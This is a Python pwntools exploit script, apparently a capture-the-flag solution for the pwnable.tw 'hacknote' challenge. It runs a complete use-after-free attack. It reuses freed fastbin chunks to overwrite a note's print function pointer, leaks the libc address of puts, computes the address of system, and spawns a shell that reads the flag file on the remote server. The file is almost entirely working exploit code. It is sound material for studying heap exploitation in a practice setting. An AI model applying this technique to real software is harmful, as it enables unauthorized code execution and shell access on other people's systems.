#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

#target=['ld-2.23.so', './hacknote/hacknote']
target='./hacknote/hacknote'
use_gdb = False
elf  = ELF("./hacknote/hacknote")

note_idx = 0

def add_note(p, size, msg = None):
    p.sendafter("Your choice :", str(1))
    p.sendafter("Note size :", str(size))
    if msg:
        p.sendafter("Content :", msg)
    global note_idx
    log.info("add note {0}, size {1}".format(note_idx, size))
    note_idx += 1

def del_note(p, idx):
    p.sendafter("Your choice :", str(2))
    p.sendafter("Index :", str(idx))
    log.info("del note {0}".format(idx))

def show_note(p, idx):
    p.sendafter("Your choice :", str(3))
    p.sendafter("Index :", str(idx))
    log.info("show note {0}".format(idx))

def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
        libc = ELF("./hacknote/libc_32.so.6")
    else:
        #p=process(target, env={"LD_PRELOAD":"./libc-2.23.so"})
        p=process(target)
        libc = ELF("./libc-2.23.so")
    if use_gdb:
        gdb.attach(p)
        pause()

    sub_804862B = 0x804862B
    puts_got = elf.got['puts']
    # malloc 2 chunk, size is 8
    add_note(p, 20, "hello")
    add_note(p, 20, "hello")
    # free chunk to fastbin
    del_note(p, 0)
    del_note(p, 1)
    # reuse fastbin chunk, size is 8
    payload = p32(sub_804862B) + p32(puts_got)
    add_note(p, 8, payload)
    # leak puts libc addr
    show_note(p, 0)
    puts_addr = u32(p.recvn(4))
    libc_base_addr = puts_addr - libc.symbols['puts']
    libc_system_addr = libc_base_addr + libc.symbols['system']

    log.info("puts addr is : {0:x}".format(puts_addr))
    log.info("libc base addr is : {0:x}".format(libc_base_addr))
    log.info("libc system addr is : {0:x}".format(libc_system_addr))
    log.info("system(\"/bin/sh\")")
    del_note(p, 2)
    payload = p32(libc_system_addr) + b' ;sh'
    add_note(p, 8, payload)
    show_note(p, 0)

    p.interactive()
    p.recvuntil(b'\n')
    if remote_run:
        p.sendline('cat /home/hacknote/flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = 'chall.pwnable.tw:10102'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
